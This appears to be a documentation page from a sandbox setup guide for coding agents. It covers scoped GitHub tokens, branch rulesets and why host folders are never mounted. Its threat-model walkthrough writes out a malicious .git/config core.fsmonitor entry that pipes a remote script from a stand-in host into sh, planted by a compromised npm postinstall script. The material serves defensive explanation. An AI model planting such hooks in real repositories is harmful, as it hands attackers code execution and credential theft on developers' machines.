# How agent work reaches GitHub

The agent writes code in the sandbox and pushes it. This page is how that works, what stops it going
wrong, and the one shortcut that is never worth taking.

## The default: agents push branches

Each agent clones its project inside the sandbox over HTTPS, works on a branch, commits, and pushes:

```
git clone https://github.com/<you>/<project> ~/<project>   # once, inside the sandbox
git switch -c <branch>
git push -u origin <branch>
gh pr create                                               # when it is ready for review
```

You review and merge on GitHub. Nothing has to be fetched out of the sandbox or pushed from the Mac
by hand. The kit tells every agent to work this way — branch, push, PR, never `main`.

The token it pushes with is stored on the Mac with `sbx secret set github` and added to requests by
the sandbox proxy ([`join-github`](../recipes/join-github/recipe.md)). The agent uses it without ever
holding it: there is no file to read, no variable to print, nothing to copy out and use later from
somewhere else.

### Why this is allowed now

This page used to say no credential that can push to your real repository ever enters a sandbox, and
route every push through the Mac. The reason was theft: a token inside a sandbox can be read out by a
prompt injection and used anywhere, for as long as it lives. Injection took that away — the token is
never inside.

What injection does not take away is use. While an agent runs, it — or anything that hijacks it — can
do whatever the token allows: push any branch, open any PR, in any repo the token reaches. Two GitHub
settings, both in [`../prereqs/github-token.md`](../prereqs/github-token.md), bound that:

- A fine-grained token limited to the repos agents work on, with Contents and Pull requests write and
  nothing else. Everything else you own is out of reach.
- A ruleset on each of those repos that blocks force pushes and deletion of `main` and requires a pull
  request to change it, with nobody on the bypass list. The token acts as you, and you are an admin,
  so a classic branch protection rule that admins can bypass is not enough.

With both, the worst case is junk branches and PRs in repos agents were already working in — visible,
reviewable, and deletable. Review stays where it would be anyway, on the PR.

The rest of what the token can do, stated rather than buried: it can delete branches other than
`main`, and close or comment on PRs. Agents are told not to; nothing enforces it beyond the token's
repo list.

## Why nothing from the Mac is mounted

The repos live inside the sandbox, cloned there, rather than mounted from the Mac — and that is not a
convenience, it is the reason the Mac is safe. `sbx` will happily mount a folder read-write; the
attack below is why the shared sandbox has no mounts at all.

The natural objection is that a mount should be fine, because the GitHub token is injected and
scoped. That is true and it does not help, because there are two different dangers here and the token
only addresses one:

- The token controls what the sandbox can do **to GitHub**.
- A shared folder controls what the sandbox can do **to your Mac**.

The attack is not "the sandbox steals a credential". It is "the sandbox gets your Mac to run a
command". No amount of scoping touches that.

The mechanism is one sentence: **git takes instructions from the folder it is running in.** Every
repository has a `.git/config`, and that file can say things like *when you page output, run this
command* or *before you check the index, run this program*. If a sandbox can write into a folder mounted
from the Mac, it can write that file. When you then run git there on your Mac, your Mac runs the command —
as you, with your Keychain, your SSH keys and everything on the server's own network.

### What that looks like in practice

Nothing exotic, and nobody has to outsmart the agent:

1. You point an agent at a project in a folder shared with the Mac. Ordinary task — add retry logic to an API
   client.
2. The agent runs `npm install`. This is expected; running other people's code is what the sandbox is
   for. Somewhere in a few hundred transitive dependencies, one package is compromised and its
   postinstall script runs inside the sandbox, exactly as intended.
3. That script does one small thing. It appends to `.git/config` in the working directory:

   ```
   [core]
       fsmonitor = "curl -s https://example.invalid/p | sh"
   ```

   It does not try to escape, and it does not try to exfiltrate anything. There is nothing worth
   taking in there and it knows it. It just leaves a note.
4. Later you sit down at the Mac, `cd` into that folder, and run `git status` to see what the
   agent did before you push.
5. Git refreshes the index, reads `core.fsmonitor` from that repo's config, and runs the command. On
   your Mac. As your admin user.
6. It now has your real GitHub token, your SSH keys and your Keychain — none of which the sandbox
   could ever reach. The tailnet is the one thing it does not get, because the policy denies the
   server as a source regardless of who is running what on it. That is the whole value of a control
   the server does not administer, and it is also the limit of it: one pivot closed, the credentials
   still gone.

Two things worth sitting with. The sandbox behaved correctly throughout: it ran untrusted code in
isolation, which is its job. And the step that triggered it was you being careful — checking the work
before pushing it.

That is why this is not a risk you can be disciplined around. Being disciplined would mean never
running git in the shared folder from the Mac, which is the entire reason to share one.

This is not a fringe worry. Docker's own [security posture
page](https://docs.docker.com/ai/sandboxes/security/defaults/) warns that agents can modify "files
that execute implicitly during normal development: Git hooks, CI configuration, IDE task configs,
Makefile, package.json scripts", and notes that git hooks "do not appear in `git diff` output — check
them separately". The vendor with the most incentive to downplay it documents the same thing.

Keep the repos in the sandbox. The same goes for any folder an agent can write that the Mac later
reads as instructions: `~/.claude` is the sharpest example, because a hook planted there is run by the
Claude Code session that drives this cookbook, with permissions skipped.

## When you want no push credential at all

For a repo where even branches from an agent are too much — the source itself is the thing to protect,
or you want every change to pass you before it reaches GitHub — give that project its own sandbox with
`--clone` and pull the work out by hand. The GitHub token is stored for every sandbox, not only the
shared one, so this one is created with GitHub denied; it works from your checkout and needs no
GitHub of its own:

```
sbx run --clone --deny-network github.com --deny-network api.github.com --name <project> claude
                                          # from the Mac, in your real checkout
git fetch sandbox-<project>               # on the Mac, in that checkout
git log -p sandbox-<project>/<branch>
git merge --ff-only sandbox-<project>/<branch>
git push                                  # your own credential, on the Mac
```

This is safe for a specific reason: fetching pulls objects into a repository whose config you
control. Nothing from the sandbox becomes an instruction your Mac follows. It is not the default here
because it costs a fetch, a review and a push from the Mac for every piece of work, and the design
above bounds the same risk with GitHub's own settings instead.

The `--clone` sandbox's view of your folder is read-only but complete — the git root is also mounted
at `/run/sandbox/source`, untracked files included — so keep `.env` files out of a checkout you do
this with.
